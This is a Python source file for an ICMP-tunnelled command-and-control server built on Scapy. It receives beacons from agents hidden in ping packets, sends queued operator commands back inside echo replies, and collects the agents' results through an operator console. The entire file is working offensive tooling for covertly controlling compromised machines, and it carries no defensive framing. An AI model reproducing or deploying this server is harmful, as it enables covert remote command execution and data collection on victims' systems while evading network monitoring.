# c2_server.py
from scapy.all import *
import threading

C2_IP = "192.168.1.100"  # Your C2 server IP
MAX_CLIENTS = 20
COMMANDS = {}   # agent_id -> list of queued commands
RESULTS = {}    # agent_id -> list of received results
ACTIVE_AGENTS = set()

lock = threading.Lock()

def handle_request(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8 and Raw in pkt:
        payload = pkt[Raw].load.decode(errors="ignore")
        fields = payload.split("|", 3)

        if len(fields) < 4:
            return

        agent_id, msg_type, seq, data = fields

        with lock:
            ACTIVE_AGENTS.add(agent_id)

            if msg_type == "BEACON":
                cmd = COMMANDS.get(agent_id, [])
                if cmd:
                    next_cmd = cmd.pop(0)
                    reply_payload = f"{agent_id}|CMD|0|{next_cmd}"
                else:
                    reply_payload = f"{agent_id}|NO_CMD|0|"
                send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)

            elif msg_type == "RESULT":
                RESULTS.setdefault(agent_id, []).append((int(seq), data))
                reply_payload = f"{agent_id}|ACK|{seq}|"
                send(IP(dst=pkt[IP].src)/ICMP(type=0)/reply_payload, verbose=0)

def operator_console():
    print("[*] Operator console ready. Type 'help' for commands.")
    while True:
        cmd = input("C2> ").strip()
        if cmd == "list":
            with lock:
                if ACTIVE_AGENTS:
                    print("[*] Active agents:")
                    for agent in ACTIVE_AGENTS:
                        print(f" - {agent}")
                else:
                    print("No active agents yet.")
        elif cmd.startswith("task "):
            try:
                agent_id, command = cmd.split(" ", 2)[1:]
                with lock:
                    COMMANDS.setdefault(agent_id, []).append(command)
                    print(f"[+] Queued command for {agent_id}: {command}")
            except:
                print("Usage: task <agent_id> <command>")
        elif cmd.startswith("results "):
            try:
                agent_id = cmd.split(" ", 1)[1]
                with lock:
                    chunks = sorted(RESULTS.get(agent_id, []))
                    if not chunks:
                        print(f"No results for {agent_id}")
                    else:
                        print(f"--- Results from {agent_id} ---")
                        print("\n".join(chunk for _, chunk in chunks))
                        print("-------------------------------")
            except:
                print("Usage: results <agent_id>")
        elif cmd == "help":
            print("Commands:")
            print("  list                 - List active agents")
            print("  task <id> <cmd>      - Queue a command for an agent")
            print("  results <id>         - Show results from an agent")
            print("  exit                 - Stop the server")
        elif cmd == "exit":
            print("[*] Stopping server...")
            os._exit(0)

def start_c2():
    print("[*] Starting ICMP C2 server...")
    threading.Thread(target=operator_console, daemon=True).start()
    sniff(filter="icmp", prn=handle_request)

if __name__ == "__main__":
    start_c2()
